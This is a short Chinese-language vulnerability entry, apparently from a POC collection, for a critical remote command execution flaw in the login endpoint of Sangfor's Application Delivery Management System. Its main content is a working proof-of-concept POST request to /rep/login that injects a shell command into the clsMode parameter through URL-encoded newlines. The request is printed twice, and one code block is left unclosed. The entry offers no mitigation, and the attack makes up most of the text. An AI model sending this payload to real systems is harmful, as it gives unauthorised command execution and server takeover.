# 深信服 应用交付管理系统 login 远程命令执行漏洞

## 漏洞描述
深信服 应用交付管理系统 login 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登陆页面

![image-20230828164544551](images/image-20230828164544551.png)

验证POC

```
POST /rep/login 

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123

## Payloads
```
POST /rep/login 

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```
